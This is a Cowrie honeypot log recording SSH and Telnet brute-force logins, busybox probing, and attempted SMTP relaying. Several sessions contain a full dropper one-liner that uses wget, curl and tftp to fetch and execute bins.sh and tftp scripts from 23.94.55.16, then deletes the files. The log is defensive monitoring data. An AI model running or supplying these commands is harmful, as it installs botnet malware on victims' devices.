+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /dev/shm/.t; rm /dev/shm/.sh; rm /dev/shm/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/shm/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/shm/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/shm/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /run/lock/.t; rm /run/lock/.sh; rm /run/lock/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/lock/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/lock/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/lock/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /boot/.t; rm /boot/.sh; rm /boot/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /boot/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /boot/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /boot/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /home/.t; rm /home/.sh; rm /home/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /home/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /home/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /home/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: cd /
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cd /
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox cp /bin/echo dvrRunNer; >dvrRunNer; /bin/busybox chmod 777 dvrRunNer; /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cp /bin/echo dvrRunNer
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cp /bin/echo dvrRunNer
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: > /dvrRunNer
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox chmod 777 /dvrRunNer
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: chmod 777 /dvrRunNer
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox cat /bin/echo
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /bin/echo
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /bin/echo
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:26+0000 [HoneyPotSSHTransport,937,178.42.38.241] NEW KEYS
+2017-06-17T00:25:26+0000 [HoneyPotSSHTransport,936,178.42.38.241] NEW KEYS
+2017-06-17T00:25:26+0000 [HoneyPotSSHTransport,937,178.42.38.241] starting service 'ssh-userauth'
+2017-06-17T00:25:26+0000 [HoneyPotSSHTransport,936,178.42.38.241] starting service 'ssh-userauth'
+2017-06-17T00:25:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,937,178.42.38.241] 'pi' trying auth 'none'
+2017-06-17T00:25:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,937,178.42.38.241] 'pi' authenticated with 'none'
+2017-06-17T00:25:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,937,178.42.38.241] starting service 'ssh-connection'
+2017-06-17T00:25:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,936,178.42.38.241] 'pi' trying auth 'none'
+2017-06-17T00:25:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,936,178.42.38.241] 'pi' authenticated with 'none'
+2017-06-17T00:25:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,936,178.42.38.241] starting service 'ssh-connection'
+2017-06-17T00:25:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] got channel 'session' request
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] channel open
+2017-06-17T00:25:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] got global no-more-sessions@openssh.com request
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:29+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 46.166.185.242:50264 (10.8.41.81:2223) [session: TT678]
+2017-06-17T00:25:29+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:32613 (10.8.41.81:2222) [session: 7179ba2b]
+2017-06-17T00:25:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] got channel 'session' request
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] channel open
+2017-06-17T00:25:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] got global no-more-sessions@openssh.com request
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] connection lost
+2017-06-17T00:25:29+0000 [HoneyPotSSHTransport,935,113.195.145.52] Connection lost after 12 seconds
+2017-06-17T00:25:29+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:29+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:29+0000 [SSHChannel None (235) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 235
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] request_env: LANG=en_GB.UTF-8
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] executing command "scp -t /tmp/th9tnc5B"
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] Opening TTY Log: log/tty/20170617-002529-d55b11d9-0e.log
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] CMD: scp -t /tmp/th9tnc5B
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] Command found: scp -t /tmp/th9tnc5B
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] request_env: LANG=en_GB.UTF-8
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] executing command "scp -t /tmp/th9tnc5B"
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] Opening TTY Log: log/tty/20170617-002529-8340b894-0e.log
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] CMD: scp -t /tmp/th9tnc5B
+2017-06-17T00:25:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] Command found: scp -t /tmp/th9tnc5B
+2017-06-17T00:25:30+0000 [CowrieTelnetTransport,678,46.166.185.242] login attempt: 67
+2017-06-17T00:25:30+0000 [CowrieTelnetTransport,678,46.166.185.242] login return, expect: [root/jauntech]
+2017-06-17T00:25:33+0000 [CowrieTelnetTransport,678,46.166.185.242] login attempt [root/jauntech] succeeded
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Opening TTY Log: log/tty/20170617-002534-None-678i.log
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Warning: state changed and new state returned
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] CMD: sh
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Command found: sh 
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] CMD: shell
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Command not found: shell
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] CMD: cd /tmp && rm -rf * && wget http://23.94.55.16/bins.sh || curl -O http://23.94.55.16/bins.sh && chmod 777 bins.sh && ./bins.sh && busybox tftp 23.94.55.16 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 23.94.55.16 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf bins.sh tftp1.sh tftp2.sh rm-rf *
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Command found: cd /tmp
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix
+2017-06-17T00:25:34+0000 [CowrieTelnetTransport,678,46.166.185.242] Command found: wget http://23.94.55.16/bins.sh
+2017-06-17T00:25:34+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,937,178.42.38.241] received eof, sending ctrl-d to command
+2017-06-17T00:25:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,936,178.42.38.241] received eof, sending ctrl-d to command
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:34+0000 [SSHChannel None (101) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] remote eof
+2017-06-17T00:25:34+0000 [SSHChannel None (101) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] remote close
+2017-06-17T00:25:34+0000 [SSHChannel None (101) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] sending close 101
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,934,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-17T00:25:34+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:34+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:34+0000 [SSHChannel None (236) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 236
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] connection lost
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,938,113.195.145.52] Connection lost after 5 seconds
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,934,113.195.145.52] avatar root logging out
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,934,113.195.145.52] connection lost
+2017-06-17T00:25:34+0000 [HoneyPotSSHTransport,934,113.195.145.52] Connection lost after 25 seconds
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Downloaded URL (http://23.94.55.16/bins.sh) with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: curl -O http://23.94.55.16/bins.sh
+2017-06-17T00:25:35+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:35+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Not storing duplicate content 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Downloaded URL (http://23.94.55.16/bins.sh) with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/bins.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command not found: ./bins.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: busybox tftp 23.94.55.16 -c get tftp1.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: tftp 23.94.55.16 -c get tftp1.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command not found: ./tftp1.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 23.94.55.16
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 23.94.55.16
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command not found: ./tftp2.sh
+2017-06-17T00:25:35+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh tftp1.sh tftp2.sh rm-rf /tmp/bins.sh
+2017-06-17T00:25:35+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 173.194.222.27:25 from localhost:5556
+2017-06-17T00:25:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.204.27:25 from localhost:5556
+2017-06-17T00:25:36+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt: 1065
+2017-06-17T00:25:36+0000 [CowrieTelnetTransport,677,216.120.247.147] login return, expect: [root/888888]
+2017-06-17T00:25:39+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt [root/root] failed
+2017-06-17T00:25:39+0000 [CowrieTelnetTransport,677,216.120.247.147] Warning: state changed and new state returned
+2017-06-17T00:25:42+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt: 1066
+2017-06-17T00:25:42+0000 [CowrieTelnetTransport,677,216.120.247.147] login return, expect: [root/888888]
+2017-06-17T00:25:44+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt [enable/shell] failed
+2017-06-17T00:25:44+0000 [CowrieTelnetTransport,677,216.120.247.147] Warning: state changed and new state returned
+2017-06-17T00:25:45+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt: 1067
+2017-06-17T00:25:45+0000 [CowrieTelnetTransport,677,216.120.247.147] login return, expect: [root/888888]
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,677,216.120.247.147] login attempt [sh//bin/busybox ACHIU] failed
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,677,216.120.247.147] Warning: state changed and new state returned
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 173.194.222.27:25 from localhost:5556
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Not storing duplicate content 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Saved redir contents with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Not storing duplicate content 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Saved redir contents with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Closing TTY Log: log/tty/20170617-002534-None-678i.log after 13 seconds
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,678,46.166.185.242] Connection lost after 18 seconds
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,673,185.165.29.46] Closing TTY Log: log/tty/20170617-002338-None-673i.log after 129 seconds
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,673,185.165.29.46] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-17T00:25:48+0000 [CowrieTelnetTransport,673,185.165.29.46] Connection lost after 146 seconds
+2017-06-17T00:25:48+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:48+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:48+0000 [SSHChannel None (237) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 237
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.204.27:25 from localhost:5556
+2017-06-17T00:25:49+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:48034 (10.8.41.81:2222) [session: 70b251d3]
+2017-06-17T00:25:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:49+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-06-17T00:25:50+0000 [HoneyPotSSHTransport,939,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T00:25:50+0000 [HoneyPotSSHTransport,939,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T00:25:50+0000 [HoneyPotSSHTransport,939,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:50+0000 [HoneyPotSSHTransport,939,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:51+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-06-17T00:25:53+0000 [HoneyPotSSHTransport,939,113.195.145.52] NEW KEYS
+2017-06-17T00:25:54+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 46.166.185.242:56148 (10.8.41.81:2223) [session: TT679]
+2017-06-17T00:25:54+0000 [CowrieTelnetTransport,679,46.166.185.242] login attempt: 68
+2017-06-17T00:25:54+0000 [CowrieTelnetTransport,679,46.166.185.242] login return, expect: [root/jauntech]
+2017-06-17T00:25:57+0000 [CowrieTelnetTransport,679,46.166.185.242] login attempt [root/jauntech] succeeded
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Opening TTY Log: log/tty/20170617-002558-None-679i.log
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Warning: state changed and new state returned
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] CMD: sh
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Command found: sh 
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] CMD: shell
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Command not found: shell
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] CMD: cd /tmp && rm -rf * && wget http://23.94.55.16/bins.sh || curl -O http://23.94.55.16/bins.sh && chmod 777 bins.sh && ./bins.sh && busybox tftp 23.94.55.16 -c get tftp1.sh && chmod 777 tftp1.sh && ./tftp1.sh && busybox tftp -r tftp2.sh -g 23.94.55.16 && chmod 777 tftp2.sh && ./tftp2.sh && rm -rf bins.sh tftp1.sh tftp2.sh rm-rf *
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Command found: cd /tmp
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix
+2017-06-17T00:25:58+0000 [CowrieTelnetTransport,679,46.166.185.242] Command found: wget http://23.94.55.16/bins.sh
+2017-06-17T00:25:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:58+0000 [HoneyPotSSHTransport,939,113.195.145.52] starting service 'ssh-userauth'
+2017-06-17T00:25:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.204.27:25 from localhost:5556
+2017-06-17T00:25:58+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp forward to 98.138.112.34:25 with data 'QUIT\r\n'
+2017-06-17T00:25:58+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] failed to connect: Connection refused
+2017-06-17T00:25:58+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 238
+2017-06-17T00:25:58+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:58+0000 [SSHChannel None (238) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:58+0000 [HoneyPotSSHTransport,939,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-17T00:25:58+0000 [HoneyPotSSHTransport,939,113.195.145.52] connection lost
+2017-06-17T00:25:58+0000 [HoneyPotSSHTransport,939,113.195.145.52] Connection lost after 9 seconds
+2017-06-17T00:25:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 74.125.204.27:25 from localhost:5556
+2017-06-17T00:25:58+0000 [HTTPPageDownloader,client] Not storing duplicate content 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:58+0000 [HTTPPageDownloader,client] Downloaded URL (http://23.94.55.16/bins.sh) with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:58+0000 [HTTPPageDownloader,client] Command found: curl -O http://23.94.55.16/bins.sh
+2017-06-17T00:25:58+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Not storing duplicate content 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Downloaded URL (http://23.94.55.16/bins.sh) with SHA-256 3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05 to dl/3eede2a435806b1526ba994cc350791d7c303964c396ccc234f643ff3b8a8c05
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/bins.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command not found: ./bins.sh
